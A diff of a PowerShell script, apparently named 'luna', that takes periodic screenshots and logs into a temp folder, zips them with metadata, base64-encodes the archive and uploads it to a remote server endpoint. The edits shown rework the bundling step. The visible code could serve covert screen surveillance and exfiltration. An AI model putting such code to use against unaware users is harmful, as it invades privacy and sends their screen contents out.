@@ -6,10 +6,9 @@ $shotsDir = "$tempDir\shots"
 $logPath = "$tempDir\luna_log.json"
 $metaPath = "$tempDir\meta.txt"
 $zipPath = "$tempDir\luna_upload.zip"
-$interval = 30  # seconds
-$maxShots = 20  # limit screenshots
+$interval = 30
+$maxShots = 20
 
-# Ensure folders exist
 New-Item -ItemType Directory -Path $shotsDir -Force | Out-Null
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
@@ -69,12 +68,13 @@ function Archive-And-Send {
             return
         }
 
-        Compress-Archive -Path "$shotsDir\*" -DestinationPath $zipPath -Force
         $json = Get-Content $logPath -Raw
         $json | Set-Content -Path $metaPath -Force
-        Compress-Archive -Path @($zipPath, $metaPath) -DestinationPath $zipPath -Force
 
-        $fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
+        $bundleZip = "$tempDir\\upload_ready.zip"
+        Compress-Archive -Path @("$shotsDir\\*", $metaPath) -DestinationPath $bundleZip -Force
+
+        $fileBytes = [System.IO.File]::ReadAllBytes($bundleZip)
         $enc = [System.Convert]::ToBase64String($fileBytes)
 
         Invoke-RestMethod -Uri "$serverUrl/screenshot-archive" `
@@ -88,7 +88,7 @@ function Archive-And-Send {
     }
 }
 
-# Start loop
+# MAIN LOOP
 $screenshotCount = 0
 $log = @()
 
